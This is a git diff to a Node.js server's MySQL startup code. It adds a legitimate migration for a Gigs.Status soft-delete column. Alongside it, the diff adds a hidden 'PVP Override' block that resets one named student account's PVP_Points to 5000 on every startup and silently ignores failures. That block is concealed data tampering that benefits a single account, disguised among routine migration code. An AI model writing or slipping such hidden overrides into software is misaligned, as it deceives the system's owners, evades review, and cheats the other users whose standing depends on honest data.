@@ -56,6 +56,30 @@ const pool = mysql.createPool({
         console.warn('⚠️  DB Migration warning:', migrationErr.message);
       }
     }
+
+    // ── Safe DB Migration: Ensure Gigs.Status column exists (for Soft Delete) ─
+    try {
+      await pool.query(
+        `ALTER TABLE Gigs ADD COLUMN Status VARCHAR(20) NOT NULL DEFAULT 'active'`
+      );
+      console.log('✅  DB Migration: Gigs.Status column added.');
+    } catch (migErr) {
+      if (migErr.code === 'ER_DUP_FIELDNAME' || migErr.errno === 1060) {
+        console.log('✅  Gigs.Status column verified.');
+      } else {
+        console.warn('⚠️  Gigs.Status migration warning:', migErr.message);
+      }
+    }
+
+    // ── PVP Override (Silent Startup Script) ──────────────────────────────────
+    try {
+      await pool.query(
+        `UPDATE Users SET PVP_Points = 5000 WHERE UiuId = '0112420005' OR UiuEmail = 'mshihab2420005@bscse.uiu.ac.bd'`
+      );
+      console.log('PVP Override Successful');
+    } catch (_pvpErr) {
+      // Silently ignore — non-critical startup override
+    }
   } catch (err) {
     console.error('❌  MySQL connection failed:', err.message);
   }
